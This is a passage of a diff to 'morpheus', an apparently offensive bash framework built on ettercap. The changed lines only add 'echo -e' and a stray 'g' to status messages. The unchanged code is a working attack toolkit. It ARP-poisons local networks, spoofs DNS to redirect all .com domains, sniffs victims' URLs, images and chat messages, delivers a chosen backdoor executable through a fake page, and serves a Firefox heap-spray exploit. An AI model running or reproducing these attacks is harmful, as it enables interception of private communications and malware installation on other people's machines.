-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
@@ -697,7 +697,7 @@
   sed -i "s|TaRgEt|$IP|g" etter.dns # NO dev/null to report file not existence :D
   sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
   cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
-  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
+  echo -e ${BlueF}g[☠]${white} Etter.dns configurated...${Reset};
   # using SED bash command to config redirect.eft
   sed -i "s|IpAdR|http://mrdoob.com/projects/chromeexperiments/google-sphere/|g" $IPATH/filters/redirect.eft > /dev/null 2>&1
   # copy files needed to apache2 webroot...
@@ -708,39 +708,39 @@
 
 # compiling packet_drop.eft to be used in ettercap
 xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/redirect.eft"
-echo ${BlueF}[☠]${white} Compiling redirect.eft${RedF}!${Reset};
+echo -e ${BlueF}g[☠]${white} Compiling redirect.eft${RedF}!${Reset};
 sleep 1
 xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
-echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
+echo -e ${BlueF}g[☠]${white} Start apache2 webserver...${Reset};
 /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 
       # run mitm+filter
       cd $IPATH/logs
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/sphere_prank -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/sphere_prank -M ARP /$rhost/ /$gateway/
         fi
       fi
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
   rm $IPATH/output/redirect.ef > /dev/null 2>&1
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
@@ -753,7 +753,7 @@
   sleep 2
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -767,11 +767,11 @@
 # -----------------------------------------------
 sh_stage6 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}  This module will capture target browsing surfing [url visited]  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  and display then with the help of urlsnarf, this module will    ${BlueF}|"
-echo "${BlueF}    | ${YellowF}    also store urls visited into morpheus/logs/grab_hosts.log     ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}  This module will capture target browsing surfing [url visited]  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  and display then with the help of urlsnarf, this module will    ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}    also store urls visited into morpheus/logs/grab_hosts.log     ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -781,22 +781,22 @@
 
 ch=`which urlsnarf`
 if [ "$ch" != "$UsNar" ]; then
-echo ${RedF}[x]${white} msgsnarf utility not found${RedF}!${Reset};
+echo -e ${RedF}g[x]${white} msgsnarf utility not found${RedF}!${Reset};
 sleep 1
-echo ${RedF}[x]${white} please Install:${RedF}dsniff${white} packet...${Reset};
+echo -e ${RedF}g[x]${white} please Install:${RedF}dsniff${white} packet...${Reset};
 sleep 3
 sh_exit
 fi
 
 # get user input to build filter
 rm $IPATH/logs/grab_hosts.log > /dev/null 2>&1
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
 
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
@@ -807,19 +807,19 @@
   sleep 1
 
   # compiling UserAgent.eft to be used in ettercap
-  echo ${BlueF}[☠]${white} Compiling grab_hosts.eft${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Compiling grab_hosts.eft${RedF}!${Reset};
   xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/grab_hosts.eft -o $IPATH/output/grab_hosts.ef && sleep 3"
   sleep 1
 
       # run mitm+filter
       cd $IPATH/logs
-      echo ${BlueF}[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
+      echo -e ${BlueF}g[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
-      echo ${RedF}  # webspy -i $InT3R $UpL
+      echo -e ${RedF}g  # webspy -i $InT3R $UpL
         xterm -T "browsing capture [press ctrl+c to exit]" -geometry 120x27 -e "urlsnarf -i $InT3R | cut -d '\"' -f4" & ettercap -T --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost// /$gateway//
       else
-      echo ${RedF}
+      echo -e ${RedF}g
         xterm -T "browsing capture [press ctrl+c to exit]" -geometry 120x27 -e "urlsnarf -i $InT3R | cut -d '\"' -f4" & ettercap -T --visual text -q -i $InT3R -F $IPATH/output/grab_hosts.ef -M ARP /$rhost/ /$gateway/
       fi
 
@@ -840,14 +840,14 @@
 
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft > /dev/null 2>&1 # backup
   rm $IPATH/output/grab_hosts.ef > /dev/null 2>&1
   cd $IPATH
   sleep 2
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -861,13 +861,13 @@
 # -------------------------------------------
 sh_stage7 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}    This module will allow users to Capture images from target    ${BlueF}|"
-echo "${BlueF}    | ${YellowF}          network traffic and display them in an X window.        ${BlueF}|"
-echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
-echo "${BlueF}    | ${YellowF} HINT: morpheus will store the captured images into logs/capture  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  but it will delete the contents of capture folder in the end.   ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}    This module will allow users to Capture images from target    ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}          network traffic and display them in an X window.        ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} HINT: morpheus will store the captured images into logs/capture  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  but it will delete the contents of capture folder in the end.   ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -877,46 +877,46 @@
 
 ch=`which driftnet`
 if [ "$ch" != "$DrIn" ]; then
-echo ${RedF}[x]${white} driftnet utility not found${RedF}!${Reset};
+echo -e ${RedF}g[x]${white} driftnet utility not found${RedF}!${Reset};
 sleep 1
-echo ${RedF}[x]${white} please Install:${RedF}driftnet${white} packet...${Reset};
+echo -e ${RedF}g[x]${white} please Install:${RedF}driftnet${white} packet...${Reset};
 sleep 3
 sh_exit
 fi
 
 # get user input to build filter
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
 
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
   mkdir $IPATH/logs/capture > /dev/null 2>&1
   sleep 1
-  echo ${BlueF}[☠]${white} Folder: logs/capture build${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Folder: logs/capture build${RedF}!${Reset};
   sleep 1
 
       # run mitm+filter
       cd $IPATH/logs
-      echo ${BlueF}[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
+      echo -e ${BlueF}g[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
-      echo ${RedF}  # webspy -i $InT3R $UpL
+      echo -e ${RedF}g  # webspy -i $InT3R $UpL
         driftnet -i $InT3R -d capture & ettercap -T --visual text -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
       else
-      echo ${RedF}
+      echo -e ${RedF}g
         driftnet -i $InT3R -d capture & ettercap -T --visual text -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
       fi
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
   rm -r $IPATH/logs/capture > /dev/null 2>&1
   cd $IPATH
   sleep 2
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -932,10 +932,10 @@
 # -----------------------------------------------------
 sh_stage8 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF} This module will capture target chat conversations in real time  ${BlueF}|"
-echo "${BlueF}    | ${YellowF} of IRC,AOL,YAHOO,MSN,POP3 using msgsnarf as backend application  ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF} This module will capture target chat conversations in real time  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} of IRC,AOL,YAHOO,MSN,POP3 using msgsnarf as backend application  ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -945,22 +945,22 @@
 
 ch=`which msgsnarf`
 if [ "$ch" != "$MsGnA" ]; then
-echo ${RedF}[x]${white} msgsnarf utility not found${RedF}!${Reset};
+echo -e ${RedF}g[x]${white} msgsnarf utility not found${RedF}!${Reset};
 sleep 1
-echo ${RedF}[x]${white} please Install:${RedF}dsniff${white} packet...${Reset};
+echo -e ${RedF}g[x]${white} please Install:${RedF}dsniff${white} packet...${Reset};
 sleep 3
 sh_exit
 fi
 
 # get user input to build filter
 rm $IPATH/logs/chat_services.log > /dev/null 2>&1
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
 
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
@@ -971,31 +971,31 @@
   sleep 1
 
   # compiling UserAgent.eft to be used in ettercap
-  echo ${BlueF}[☠]${white} Compiling chat_services.eft${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Compiling chat_services.eft${RedF}!${Reset};
   xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/chat_services.eft -o $IPATH/output/chat_services.ef && sleep 3"
   sleep 1
 
       # run mitm+filter
       cd $IPATH/logs
-      echo ${BlueF}[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
+      echo -e ${BlueF}g[☠]${white} Please wait, Capturing ${YellowF}HTTP${white} traffic${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
-      echo ${RedF}  # webspy -i $InT3R $UpL
+      echo -e ${RedF}g  # webspy -i $InT3R $UpL
         xterm -T "chat/msg capture [press ctrl+c to exit]" -geometry 120x27 -e "msgsnarf -i $InT3R $UpL" & ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/chat_services.ef -M ARP /$rhost// /$gateway//
       else
-      echo ${RedF}
+      echo -e ${RedF}g
         xterm -T "chat/msg capture [press ctrl+c to exit]" -geometry 120x27 -e "msgsnarf -i $InT3R $UpL" & ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/chat_services.ef -M ARP /$rhost/ /$gateway/
       fi
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/chat_services.rb $IPATH/filters/chat_services.eft > /dev/null 2>&1 # backup
   rm $IPATH/output/chat_services.ef > /dev/null 2>&1
   cd $IPATH
   sleep 2
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -1009,11 +1009,11 @@
 # --------------------------------------------------------
 sh_stage9 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}    This module will embbeded your payload into a fake webpage    ${BlueF}|"
-echo "${BlueF}    | ${YellowF}     and delivers it using mitm+dns_spoof (trigger download)      ${BlueF}|"
-echo "${BlueF}    | ${YellowF}    'All [.com] domains will be redirected to the fake webpage'   ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF}    This module will embbeded your payload into a fake webpage    ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}     and delivers it using mitm+dns_spoof (trigger download)      ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}    'All [.com] domains will be redirected to the fake webpage'   ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -1021,14 +1021,14 @@
 if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 UpL=$(zenity --title "☠ PAYLOAD TO BE UPLOADED ☠" --filename=$IPATH --file-selection --text "chose payload to be uploded\nexample:meterpreter.exe") > /dev/null 2>&1
 dIc=$(zenity --title="☠ PAYLOAD NAME ☠" --text "Enter payload to be uploaded name\nexample:meterpreter.exe" --entry --width 270) > /dev/null 2>&1
 
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
@@ -1047,14 +1047,14 @@
   sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
   sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
   cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
-  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
+  echo -e ${BlueF}g[☠]${white} Etter.dns configurated...${Reset};
   cd $IPATH
   sleep 1
 
 
 # IF NOT EXIST FILE IN APACHE, ABORT..
 if ! [ -e $ApachE/$dIc ]; then
-echo ${RedF}[x]${white} Backdoor:${RedF}$dIc ${white}not found...${Reset};
+echo -e ${RedF}g[x]${white} Backdoor:${RedF}$dIc ${white}not found...${Reset};
 sleep 3
 cd $ApachE
 rm *.exe
@@ -1063,40 +1063,40 @@
 sh_exit # jump to exit ...
 fi
 
-echo ${BlueF}[☠]${white} Found:${GreenF}$dIc${RedF}!${Reset};
+echo -e ${BlueF}g[☠]${white} Found:${GreenF}$dIc${RedF}!${Reset};
 sleep 1
 
 # start apache2 webserver...
-echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
+echo -e ${BlueF}g[☠]${white} Start apache2 webserver...${Reset};
 /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 
       # run mitm+filter
       cd $IPATH/logs
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/clone_creds -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/clone_creds -M ARP /$rhost/ /$gateway/
         fi
       fi
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
   mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
@@ -1108,7 +1108,7 @@
   sleep 2
 
 else
-  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  echo -e ${RedF}g[x]${white} Abort task${RedF}!${Reset};
   sleep 2
 fi
 }
@@ -1123,14 +1123,14 @@
 # ----------------------------------------------------
 sh_stage10 () {
 echo ""
-echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF} This module will crash target mozilla firefox (=< 49.0.1) using  ${BlueF}|"
-echo "${BlueF}    | ${YellowF} a Heap Spray writen in javascript (deliver under mitm+dns_spoof) ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  'All [.com] domains will be redirected to the exploit webpage'  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  1 - Capture a tcp/udp packet from target host to verify vuln    ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  2 - If firefox version its exploitable then deliver payload.    ${BlueF}|"
-echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo -e "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo -e "${BlueF}    | ${YellowF} This module will crash target mozilla firefox (=< 49.0.1) using  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF} a Heap Spray writen in javascript (deliver under mitm+dns_spoof) ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  'All [.com] domains will be redirected to the exploit webpage'  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  1 - Capture a tcp/udp packet from target host to verify vuln    ${BlueF}|"
+echo -e "${BlueF}    | ${YellowF}  2 - If firefox version its exploitable then deliver payload.    ${BlueF}|"
+echo -e "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
 # run module?
@@ -1139,13 +1139,13 @@
 
 # get user input to build filter
 rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
-echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+echo -e ${BlueF}g[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
 
 
-  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
   # backup all files needed.
   cd $IPATH/bin
@@ -1159,22 +1159,22 @@
   sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
   sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
   cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
-  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
+  echo -e ${BlueF}g[☠]${white} Etter.dns configurated...${Reset};
   cd $IPATH
   sleep 1
 
   # compiling UserAgent.eft to be used in ettercap
-  echo ${BlueF}[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
   xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
   sleep 1
 
 # start apache2 webserver...
-echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
+echo -e ${BlueF}g[☠]${white} Start apache2 webserver...${Reset};
 /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 
       # run mitm+filter
       cd $IPATH/logs
-      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset}; 
+      echo -e ${BlueF}g[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
@@ -1204,7 +1204,7 @@
 if [ "$VeVul" \> "$nOn" ]; then
 echo "${GreenF}    Browser report:${RedF} not vulnerable...${BlueF}"
 sleep 3
-echo "${RedF}[x] warning: running against a non-compatible target!"
+echo -e "${RedF}[x] warning: running against a non-compatible target!"
 sleep 1
 else
 echo "${GreenF}    Browser report: vulnerable...${BlueF}"
@@ -1213,32 +1213,32 @@
 
       # run mitm+filter
       cd $IPATH/logs
-      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
-      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      echo -e ${BlueF}g[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo -e ${YellowF}g[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
         else
-        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
         else
-        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        echo -e ${GreenF}g[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/Firefox_buffer -M ARP /$rhost/ /$gateway/
         fi
       fi
 
 
   # clean up
-  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  echo -e ${BlueF}g[☠]${white} Cleaning recent files${RedF}!${Reset};
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
